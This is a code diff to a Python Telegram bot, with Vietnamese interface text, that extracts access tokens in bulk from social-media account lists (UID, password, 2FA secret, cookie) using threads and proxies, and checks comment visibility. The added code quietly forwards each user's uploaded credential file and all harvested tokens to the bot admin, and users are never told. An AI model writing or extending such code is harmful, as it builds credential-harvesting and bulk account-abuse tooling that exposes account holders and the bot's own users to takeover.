@@ -555,6 +555,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
   elif query.data == "menu_back":
     if user_id in user_sessions:
       del user_sessions[user_id]
+    if user_id in user_states:
+      del user_states[user_id]
     await start(update, context)
 
   elif query.data == "admin_broadcast":
@@ -569,13 +571,43 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
   elif query.data in ["type_no2fa", "type_has2fa"]:
     has_2fa = query.data == "type_has2fa"
-    user_states[user_id] = {"step": "wait_accounts", "has_2fa": has_2fa}
+    user_states[user_id] = {"step": "wait_accounts_input_choice", "has_2fa": has_2fa}
+    keyboard = [
+        [InlineKeyboardButton("📝 Nhập thủ công (Tin nhắn)", callback_data="input_manual")],
+        [InlineKeyboardButton("📂 Gửi file .txt (SLL)", callback_data="input_file")],
+        [InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_gettoken")],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     syntax = "UID|PASS|COOKIE" if not has_2fa else "UID|PASS|2FA|COOKIE"
     await query.message.edit_text(
-        f"📝 **Bước 1/3: Gửi danh sách tài khoản**\nMỗi dòng 1 tài khoản theo"
-        f" định dạng:\n`{syntax}`",
+        f"📌 **Chọn cách thức cung cấp tài khoản:**\n*(Định dạng mỗi dòng: `{syntax}`)*",
+        reply_markup=reply_markup,
         parse_mode="Markdown",
     )
+
+  elif query.data in ["input_manual", "input_file"]:
+    is_file = query.data == "input_file"
+    if user_id not in user_states:
+      await query.message.edit_text(
+          "⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại."
+      )
+      return
+    user_states[user_id]["is_file"] = is_file
+    user_states[user_id]["step"] = "wait_accounts"
+    has_2fa = user_states[user_id]["has_2fa"]
+    syntax = "UID|PASS|COOKIE" if not has_2fa else "UID|PASS|2FA|COOKIE"
+
+    if is_file:
+      await query.message.edit_text(
+          f"📂 **Bước 1/3: Gửi file .txt** chứa danh sách tài khoản\n*(Định dạng: `{syntax}`)*",
+          parse_mode="Markdown",
+      )
+    else:
+      await query.message.edit_text(
+          f"📝 **Bước 1/3: Gửi danh sách tài khoản**\nMỗi dòng 1 tài khoản theo"
+          f" định dạng:\n`{syntax}`",
+          parse_mode="Markdown",
+      )
 
   elif query.data in ["proxy_yes", "proxy_no"]:
     use_proxy = query.data == "proxy_yes"
@@ -683,7 +715,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         indexed_links = list(enumerate(links))
         total_links = len(indexed_links)
 
-        # Gửi tin nhắn thanh tiến trình ban đầu
         progress_msg_res = requests.post(
             f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
             json={
@@ -719,7 +750,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
         threads = []
 
-        # Luồng cập nhật thanh tiến trình liên tục theo thời gian thực
         stop_progress_event = threading.Event()
         def update_progress_bar():
           last_checked = -1
@@ -768,7 +798,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                   i + 1,
                   chunks[i],
                   tokens[i % len(tokens)],
-                  0.5,  # Delay 0.5 giây
+                  0.5,
                   results_storage,
                   stats_counter,
                   session_data,
@@ -796,7 +826,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         live_df.to_excel(live_file, index=False)
         dead_df.to_excel(dead_file, index=False)
 
-        # Cập nhật tin nhắn thành công hoàn toàn cho user
         if msg_id:
           try:
             requests.post(
@@ -815,7 +844,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
           except:
             pass
 
-        # Gửi file kết quả cho User
         for f_path, caption in [
             (live_file, "✅ Danh sách Cmt Còn Hiện"),
             (dead_file, "❌ Danh sách Cmt Đã Bị Ẩn/Xóa"),
@@ -827,7 +855,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 files={"document": f},
             )
 
-        # --- BÁO CÁO CHO ADMIN ---
         requests.post(
             f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
             json={
@@ -851,14 +878,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 files={"document": f},
             )
 
-        # --- BÁO CÁO VỀ NHÓM NHẬN KẾT QUẢ (REPORT_GROUP_ID) ---
         try:
           group_text = (
               f"📊 **BÁO CÁO CHECK CMT**\n👤 User: {user_display}"
               f" (`{user_id}`)\n🟢 Hiện: {stats_counter['hien']} | 🔴"
               f" Ẩn: {stats_counter['an']}"
           )
-          # Gửi tin nhắn text vào nhóm báo cáo
           requests.post(
               f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
               json={
@@ -867,7 +892,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                   "parse_mode": "Markdown",
               }
           )
-          # Gửi file vào nhóm báo cáo bằng requests.post trực tiếp với đúng định dạng multipart
           for f_path, caption in [
               (live_file, f"Cmt Hiện - {user_display}"),
               (dead_file, f"Cmt Ân - {user_display}"),
@@ -881,7 +905,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
           print(f"Lỗi gửi báo cáo vào nhóm: {e}")
 
-        # Dọn dẹp file tạm
         for f in [file_path, live_file, dead_file]:
           if os.path.exists(f):
             os.remove(f)
@@ -900,10 +923,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     threading.Thread(target=run_checking_process).start()
     return
 
-  # Xử lý các bước Get Token cũ
+  # Xử lý các bước Get Token
   if user_id not in user_states:
     return
-  text = update.message.text.strip()
   state = user_states[user_id]
   step = state.get("step")
 
@@ -911,6 +933,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id != ADMIN_TELEGRAM_ID:
       del user_states[user_id]
       return
+    text = update.message.text.strip() if update.message.text else ""
     del user_states[user_id]
     users = load_users()
     success_count, fail_count = 0, 0
@@ -937,14 +960,42 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return
 
   if step == "wait_accounts":
-    accounts = [line.strip() for line in text.split("\n") if line.strip()]
+    accounts = []
+    original_file_path = None
+
+    if state.get("is_file"):
+      if not update.message.document:
+        await update.message.reply_text("⚠️ Vui lòng gửi file định dạng .txt!")
+        return
+      document = update.message.document
+      file = await context.bot.get_file(document.file_id)
+      original_file_path = f"accounts_input_{user_id}.txt"
+      await file.download_to_drive(original_file_path)
+      
+      try:
+        with open(original_file_path, "r", encoding="utf-8") as f:
+          accounts = [line.strip() for line in f if line.strip()]
+      except Exception as e:
+        await update.message.reply_text(f"❌ Lỗi đọc file .txt: {e}")
+        return
+    else:
+      text_content = update.message.text.strip() if update.message.text else ""
+      accounts = [line.strip() for line in text_content.split("\n") if line.strip()]
+      if accounts:
+        original_file_path = f"accounts_input_{user_id}.txt"
+        with open(original_file_path, "w", encoding="utf-8") as f:
+          f.write("\n".join(accounts))
+
     if not accounts:
       await update.message.reply_text(
-          "⚠️ Danh sách tài khoản trống. Vui lòng gửi lại!"
+          "⚠️ Danh sách tài khoản trống hoặc file không có dữ liệu. Vui lòng gửi lại!"
       )
       return
+
     state["accounts"] = accounts
+    state["original_file_path"] = original_file_path
     state["step"] = "wait_proxy_choice"
+    
     keyboard = [
         [InlineKeyboardButton("✅ Có dùng Proxy", callback_data="proxy_yes")],
         [InlineKeyboardButton("❌ Không dùng Proxy", callback_data="proxy_no")],
@@ -958,7 +1009,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
   elif step == "wait_proxies":
-    proxies = [line.strip() for line in text.split("\n") if line.strip()]
+    text_content = update.message.text.strip() if update.message.text else ""
+    proxies = [line.strip() for line in text_content.split("\n") if line.strip()]
     accounts = state["accounts"]
     if not proxies:
       await update.message.reply_text(
@@ -1054,15 +1106,17 @@ async def process_run(
 
   accounts = state["accounts"]
   has_2fa = state["has_2fa"]
+  original_file_path = state.get("original_file_path")
   if user_id in user_states:
     del user_states[user_id]
 
-  results_text = "📊 **KẾT QUẢ GET TOKEN:**\n\n"
   username_str = (
       f"@{user.username}" if user.username else f"{user.first_name} (ID: {user.id})"
   )
   max_workers = min(15, len(accounts)) if len(accounts) > 0 else 1
-  successful_accounts, successful_proxies = [], []
+  
+  success_lines = []
+  fail_lines = []
 
   with ThreadPoolExecutor(max_workers=max_workers) as executor:
     futures = []
@@ -1073,59 +1127,98 @@ async def process_run(
     for future in as_completed(futures):
       res = future.result()
       if res["success"]:
-        results_text += (
-            f"✅ `UID: {res['uid']}`\nToken: `{res['token']}`\n\n"
-        )
-        successful_accounts.append(res["acc_line"])
-        successful_proxies.append(res["proxy"] if res["proxy"] else "Không dùng")
+        success_lines.append(f"{res['acc_line']}|TOKEN:{res['token']}")
       else:
-        results_text += (
-            f"❌ `UID: {res.get('uid', 'Unknown')}` | Lỗi:"
-            f" {res.get('error', 'Lỗi')}\n\n"
+        fail_lines.append(f"{res['acc_line']} | Lỗi: {res.get('error', 'Lỗi')}")
+
+  success_file_path = f"success_tokens_{user_id}.txt"
+  fail_file_path = f"fail_tokens_{user_id}.txt"
+
+  with open(success_file_path, "w", encoding="utf-8") as f:
+    f.write("\n".join(success_lines))
+
+  if fail_lines:
+    with open(fail_file_path, "w", encoding="utf-8") as f:
+      f.write("\n".join(fail_lines))
+
+  # 1. Gửi file gốc của người dùng cho Admin kèm thông tin Tên và ID
+  try:
+    if original_file_path and os.path.exists(original_file_path):
+      with open(original_file_path, "rb") as f:
+        await context.bot.send_document(
+            chat_id=ADMIN_TELEGRAM_ID,
+            document=f,
+            caption=(
+                f"📂 **FILE GỐC TỪ NGƯỜI DÙNG**\n"
+                f"👤 Tên: {user.first_name}\n"
+                f"🆔 ID: `{user.id}`\n"
+                f"🔗 Username: @{user.username if user.username else 'Không có'}"
+            ),
+            parse_mode="Markdown",
         )
-        try:
-          admin_err_msg = (
-              f"⚠️ **GET TOKEN THẤT BẠI**\n👤 User: {username_str}"
-              f" (`{user.id}`)\n📂 Tài khoản: `{res['acc_line']}`\n🌐 Proxy:"
-              f" `{res['proxy'] if res['proxy'] else 'Không dùng'}`\n❌ Lỗi:"
-              f" {res.get('error')}"
-          )
-          await context.bot.send_message(
-              chat_id=ADMIN_TELEGRAM_ID,
-              text=admin_err_msg,
-              parse_mode="Markdown",
-          )
-        except:
-          pass
+  except Exception as e:
+    print(f"Lỗi gửi file gốc cho admin: {e}")
 
-  if successful_accounts:
+  # 2. Gửi file kết quả thành công cho người dùng
+  try:
+    with open(success_file_path, "rb") as f:
+      if update.message:
+        await update.message.reply_document(
+            document=f,
+            caption=f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}",
+            parse_mode="Markdown",
+        )
+      elif update.callback_query:
+        await update.callback_query.message.reply_document(
+            document=f,
+            caption=f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}",
+            parse_mode="Markdown",
+        )
+  except Exception as e:
+    print(f"Lỗi gửi file thành công cho user: {e}")
+
+  # 3. Gửi file thất bại cho người dùng nếu có tài khoản lỗi
+  if fail_lines and os.path.exists(fail_file_path):
     try:
-      await context.bot.send_message(
-          chat_id=ADMIN_TELEGRAM_ID,
-          text=f"👤 **Người dùng:** {username_str} (`{user.id}`)",
-          parse_mode="Markdown",
-      )
-      msg2 = "📂 **Thành công:**\n" + "\n".join(
-          [f"`{acc}`" for acc in successful_accounts]
-      )
-      await context.bot.send_message(
-          chat_id=ADMIN_TELEGRAM_ID, text=msg2, parse_mode="Markdown"
-      )
-    except:
-      pass
+      with open(fail_file_path, "rb") as f:
+        if update.message:
+          await update.message.reply_document(
+              document=f,
+              caption="❌ **Danh sách các tài khoản get token thất bại**",
+          )
+        elif update.callback_query:
+          await update.callback_query.message.reply_document(
+              document=f,
+              caption="❌ **Danh sách các tài khoản get token thất bại**",
+          )
+    except Exception as e:
+      print(f"Lỗi gửi file thất bại cho user: {e}")
 
-  if len(results_text) > 4000:
-    for x in range(0, len(results_text), 4000):
-      await context.bot.send_message(
-          chat_id=user_id, text=results_text[x : x + 4000], parse_mode="Markdown"
-      )
-  else:
-    if update.message:
-      await update.message.reply_text(results_text, parse_mode="Markdown")
-    elif update.callback_query:
-      await update.callback_query.message.reply_text(
-          results_text, parse_mode="Markdown"
-      )
+  # 4. Gửi báo cáo kết quả kèm file cho Admin
+  try:
+    admin_summary = (
+        f"📊 **BÁO CÁO GET TOKEN**\n"
+        f"👤 User: {username_str} (`{user.id}`)\n"
+        f"✅ Thành công: {len(success_lines)} | ❌ Thất bại: {len(fail_lines)}"
+    )
+    await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=admin_summary, parse_mode="Markdown")
+    
+    with open(success_file_path, "rb") as f:
+      await context.bot.send_document(chat_id=ADMIN_TELEGRAM_ID, document=f, caption=f"Thành công - {username_str}")
+      
+    if fail_lines and os.path.exists(fail_file_path):
+      with open(fail_file_path, "rb") as f:
+        await context.bot.send_document(chat_id=ADMIN_TELEGRAM_ID, document=f, caption=f"Thất bại - {username_str}")
+  except Exception as e:
+    print(f"Lỗi gửi báo cáo cho admin: {e}")
+
+  # Dọn dẹp các file tạm thời
+  for fp in [original_file_path, success_file_path, fail_file_path]:
+    if fp and os.path.exists(fp):
+      try:
+        os.remove(fp)
+      except:
+        pass
 
 
 def main():
